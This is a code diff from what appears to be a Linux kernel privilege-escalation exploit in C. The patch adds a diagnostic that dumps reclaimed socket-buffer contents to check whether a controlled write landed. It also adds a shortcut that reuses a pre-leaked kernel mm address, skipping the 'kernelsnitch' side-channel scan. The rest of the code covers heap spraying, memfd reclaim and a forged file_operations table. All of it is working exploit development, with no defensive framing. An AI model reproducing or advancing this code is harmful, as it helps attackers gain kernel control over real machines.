@@ -866,6 +866,49 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
   memcpy(p + off, &value, sizeof(value));
 }
 
+/* H1A-only diagnostic: dump every qword that differs from the payload we
+ * sent into the reclaim socket.  This gives a direct answer to whether the
+ * PI chain wrote anywhere inside the controlled page, rather than relying
+ * on the two hand-picked fields checked by ks_leak_readback(). */
+void ks_leak_diff_dump(void) {
+  if (reclaim_sv[1] < 0 || !skb_buf) {
+    pr_warning("KS_DIFF no socket or buf sv=%d buf=%p\n",
+               reclaim_sv[1], (void *)skb_buf);
+    return;
+  }
+
+  static unsigned char rbuf[SKB_SEND_SIZE];
+  struct iovec iov = { rbuf, SKB_SEND_SIZE };
+  struct msghdr msg;
+  memset(&msg, 0, sizeof(msg));
+  msg.msg_iov = &iov;
+  msg.msg_iovlen = 1;
+
+  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
+    ssize_t n = recvmsg(reclaim_sv[1], &msg, MSG_DONTWAIT);
+    if (n <= 0) {
+      pr_info("KS_DIFF recv %d n=%zd errno=%d\n", i, n, errno);
+      break;
+    }
+    size_t check = (size_t)n < SKB_SEND_SIZE ? (size_t)n : SKB_SEND_SIZE;
+    size_t diff_count = 0;
+    for (size_t off = 0; off + sizeof(uint64_t) <= check; off += sizeof(uint64_t)) {
+      uint64_t old;
+      uint64_t got;
+      memcpy(&old, skb_buf + off, sizeof(old));
+      memcpy(&got, rbuf + off, sizeof(got));
+      if (old == got) continue;
+      if (diff_count < 16) {
+        pr_info("KS_DIFF skb=%d off=0x%zx old=%016llx new=%016llx\n",
+                i, off, (unsigned long long)old,
+                (unsigned long long)got);
+      }
+      diff_count++;
+    }
+    pr_info("KS_DIFF skb=%d bytes=%zu diffs=%zu\n", i, check, diff_count);
+  }
+}
+
 void put_fake_fops_table(unsigned char *p, size_t off) {
   put64(p, off + FOPS_OWNER_OFF, 0);
   put64(p, off + FOPS_LLSEEK_OFF,
@@ -1174,6 +1217,25 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   uintptr_t leaked = cached_leaked_mm;
   if (!leaked) {
+    detect_memory();
+    uintptr_t pc_mm = 0;
+    if (ks_pc_answer_read(&pc_mm) && mm_plausible(pc_mm)) {
+      leaked = pc_mm;
+      for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+        pre_ctx.memfds[i] = -1;
+      }
+      for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
+        post_ctx.memfds[i] = -1;
+      }
+      for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
+        spray_ctx.memfds[i] = -1;
+      }
+      memfd_leak = -1;
+      pr_info("KS_PC answer preloaded mm=%016zx (skipping kernelsnitch scan)\n",
+              leaked);
+    }
+  }
+  if (!leaked) {
     int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
     detect_memory();
     ks = kernelsnitch_setup(
@@ -1306,15 +1368,21 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   sched_yield();
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
-    SYSCHK(close(pre_ctx.memfds[i]));
+    if (pre_ctx.memfds[i] >= 0) {
+      SYSCHK(close(pre_ctx.memfds[i]));
+    }
     pre_ctx.memfds[i] = -1;
   }
   for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
-    SYSCHK(close(post_ctx.memfds[i]));
+    if (post_ctx.memfds[i] >= 0) {
+      SYSCHK(close(post_ctx.memfds[i]));
+    }
     post_ctx.memfds[i] = -1;
   }
   for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
-    SYSCHK(close(spray_ctx.memfds[i]));
+    if (spray_ctx.memfds[i] >= 0) {
+      SYSCHK(close(spray_ctx.memfds[i]));
+    }
     spray_ctx.memfds[i] = -1;
   }
 
@@ -1324,7 +1392,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   sched_yield();
   sched_yield();
-  SYSCHK(close(memfd_leak));
+  if (memfd_leak >= 0) {
+    SYSCHK(close(memfd_leak));
+  }
   memfd_leak = -1;
   for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
     errno = 0;
@@ -1339,7 +1409,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-    SYSCHK(close(prepare_ctx.memfds[i]));
+    if (prepare_ctx.memfds[i] >= 0) {
+      SYSCHK(close(prepare_ctx.memfds[i]));
+    }
     prepare_ctx.memfds[i] = -1;
     kill_child(prepare_ctx.childs[i]);
   }
